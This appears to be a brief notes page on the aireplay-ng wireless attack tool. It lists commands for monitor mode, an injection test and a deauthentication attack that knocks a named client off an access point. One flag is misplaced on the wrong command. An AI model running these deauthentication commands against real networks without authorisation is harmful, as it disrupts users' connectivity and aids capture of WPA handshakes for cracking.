---
title: Aireplay-ng
parent: Wireless Attack Tools
layout: default
nav_order: 3
---

1. Go into monitor mode:\
   `sudo airmon-ng start wlan0`\
   `iwconfig` to check if it works
2. Test packet injection: (Injection is working! prompt will appear)\
   `sudo aireplay-ng --test wlan0mon`
3. To perform deauth, need to first view available network, then from the bottom one choose a station to deauth it (in this example we are deauth 00:0F:B5:32:31:31 station/client from 00:14:6C:7A:41:81 wifi/access point, `-w` is to write to file):\
   `sudo airodump-ng wlan0mon`\
   `sudo aireplay-ng -0 5 -a 00:14:6C:7A:41:81 -c 00:0F:B5:32:31:31 wlan0mon -w WPApacket`